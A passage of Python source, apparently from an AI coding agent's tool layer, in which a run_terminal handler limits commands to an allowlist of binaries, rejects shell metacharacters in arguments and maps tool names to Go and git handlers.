                f"run_terminal will not run {argv[0]!r}, and {redirect!r} is an "
                "argument here rather than a redirection: argv is passed to the "
                "process directly, never through a shell.",
                fix=(
                    "To write a file, use write_file — with append=true for each "
                    "part if it is too large for one reply."
                    if redirect in (">", ">>")
                    else "Run the one command you need and read its output from the "
                    "result; there is no pipeline to build."
                ),
            )
        alternative = _TERMINAL_ALTERNATIVES.get(binary)
        fix = (
            f"Use {alternative}."
            if alternative
            else f"run_terminal allows: {', '.join(sorted(ALLOWED_BINARIES))}."
        )
        return ToolResult.failure(f"run_terminal will not run {argv[0]!r}.", fix=fix)

    for arg in argv[1:]:
        if any(ch in arg for ch in ";|&\n\r`") or "$(" in arg:
            return ToolResult.failure(
                f"argument {arg!r} contains shell metacharacters.",
                fix="There is no shell here, so they cannot do what you intend. "
                "Pass each argument separately.",
            )

    timeout = inv.arg("timeout") or 60
    done = run(argv, inv.workspace.root, timeout=timeout)
    return _result(done, what=" ".join(argv))


HANDLERS = {
    "go_build": go_build,
    "go_vet": go_vet,
    "go_test": go_test,
    "gofmt": gofmt,
    "go_mod": go_mod,
    "govalid_gen": govalid_gen,
    "golangci_lint": golangci_lint,
    "govulncheck": govulncheck,
    "git_status": git_status,
    "git_diff": git_diff,
    "git_blame": git_blame,
    "git_ops": git_ops,
    "run_terminal": run_terminal,
}
